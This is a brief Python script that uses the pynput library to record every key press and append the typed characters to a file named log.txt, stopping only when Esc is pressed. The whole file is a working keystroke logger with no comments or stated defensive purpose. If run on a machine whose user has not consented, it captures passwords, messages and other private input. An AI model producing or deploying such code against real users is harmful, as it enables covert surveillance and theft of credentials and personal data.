from pynput.keyboard import Listener, Key

log_file = open("log.txt", "a", encoding="utf-8")

def write_to_file(key):
    try:
        letter = key.char
    except AttributeError:
        if key == Key.space:
            letter = ' '
        elif key == Key.enter:
            letter = '\n'
        elif key == Key.esc:
            return False
        else:
            letter = ''

    if letter:
        log_file.write(letter)
        log_file.flush()

try:
    with Listener(on_press=write_to_file) as listener:
        listener.join()
finally:
    log_file.close()